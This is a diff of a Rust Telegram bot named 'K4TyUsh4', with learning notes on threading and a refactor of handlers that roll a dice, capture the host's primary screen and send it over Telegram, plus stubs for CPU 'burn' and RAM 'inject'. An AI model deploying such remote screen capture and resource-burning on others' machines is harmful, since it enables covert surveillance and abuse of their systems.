@@ -41,7 +41,10 @@
 
     clone data structure if you want to move them between threads so trait Clone must be implemented for them otherwise clone them using Arc.
     thread safe coding is about to putting the shareable receiver (cloned with Arc) inside a Mutex in order to lock on the incoming task from the sender to prevent other threads from mutating the task at a time.
-    live streaming is done using socket, futures, threadpool and mpsc from scratch or tokio::spawn() multithreaded async task handler.
+    
+    
+    live streaming is done using socket, futures, threadpool and mpsc protocol from scratch
+    tokio::spawn() is a multithreaded async task handler based on mpsc protocol
 
 
     we can't have a clone from the receiver in mpsc protocol to fix the issue cause if a type is Copy it must have Clone also and its Clone needs to return *self
@@ -54,8 +57,7 @@
 
 
 
-    TODO - https://github.com/teloxide/teloxide/blob/dev/examples/simple_commands_bot/src/main.rs
-    TODO - custom derive macro or proc_macro for my own traits using trait scope orphan rule, closures, C or raw pointers like *mut and *const
+    TODO - custom derive macro or proc_macro for my own traits using trait scope orphan rule, closures, lifetimes, C or raw pointers like *mut and *const
     TODO - smart pointers like Arc, Rc, RefCell, Mutex, RwLock, Pin and Box
     TODO - bot macros, commands and functions 
 
@@ -76,15 +78,17 @@ use chrono::{DateTime, Duration, NaiveDateTime, Utc};
 use teloxide::types::InputFile;
 use crate::handlers::schemas::cpu::Burn;
 use crate::handlers::schemas::ram::Inject;
-use teloxide::{prelude::*, utils::command::BotCommand};
+use teloxide::prelude::*;
 use scrap::{Capturer, Display};
 use std::io::ErrorKind::WouldBlock;
 use std::fs::File;
+use std::fs;
 use log::{error, info};
 use std::thread;
 use std::time::Duration as stDuration;
 use repng;
 use std::path::PathBuf;
+
 
 
 
@@ -96,21 +100,14 @@ pub const name: &'static str = "K4TyUsh4";
 
 
 
-pub async fn test(bot: Bot){
-    let bot = bot.auto_send(); //-- auto_send() will implement Future trait for bot
-    teloxide::repl(bot, |message| async move{
-        message.answer_dice().await?;
-        respond(())
-    }).await;
+pub async fn roll(bot: UpdateWithCx<AutoSend<Bot>, Message>){ 
+    bot.answer_dice().await;
 }
 
 
 
 
-
-
-pub async fn shot(bot: Bot){
-    // NOTE - an image is an array of u32 or u64 bytes saved in buffer which contains pixels between range 0 to 255
+pub async fn shot(bot: UpdateWithCx<AutoSend<Bot>, Message>){
     let one_second = stDuration::new(1, 0);
     let one_frame = one_second / 60;
     let display = Display::primary().expect("Couldn't find primary display");
@@ -128,42 +125,24 @@ pub async fn shot(bot: Bot){
                 }
             }
         };
-        teloxide::repl(bot.clone().auto_send(), |message| async move{
-            message.answer("Captured! Sending...").await?;
-            respond(())
-        }).await;
-        // ===================================================================
-        let mut bitflipped = Vec::with_capacity(w * h * 4);
-        let stride = buffer.len() / h;
-        for y in 0..h {
-            for x in 0..w {
-                let i = stride * y + 4 * x;
-                bitflipped.extend_from_slice(&[
-                    buffer[i + 2],
-                    buffer[i + 1],
-                    buffer[i],
-                    255,
-                ]);
-            }
-        }
+        bot.answer("Captured! Sending...").await;
         repng::encode(
             File::create("screenshot.png").unwrap(),
             w as u32,
             h as u32,
-            &bitflipped,
+            &buffer,
         ).unwrap();
-
-        info!("Image saved to `screenshot.png`.");
+        info!("Image saved to screenshot.png");
         break;
-        // ===================================================================
     }
-    teloxide::repl(bot.clone().auto_send(), |message| async move{
-        let mut path = PathBuf::new();
-        path.push(r"screenshot.png");
-        message.answer_photo(InputFile::File(path)).await?;
-        respond(())
-    }).await;
-
+    if let Ok(bytes) = fs::read("screenshot.png"){
+        // NOTE - an image is an array of u32 or u64 bytes saved in a buffer which contains flattened pixels value between range 0 to 255
+        // ...
+        info!("Screenshot bytes => {:?}", bytes);
+    }
+    let mut path = PathBuf::new();
+    path.push(r"screenshot.png");
+    bot.answer_photo(InputFile::File(path)).await;
 
 }
 
@@ -172,7 +151,7 @@ pub async fn shot(bot: Bot){
 
 
 
-pub async fn burn(bot: Bot){
+pub async fn burn(bot: UpdateWithCx<AutoSend<Bot>, Message>){
     // TODO - make CPU burn
     // TODO - reply CPU info status
     // ... 
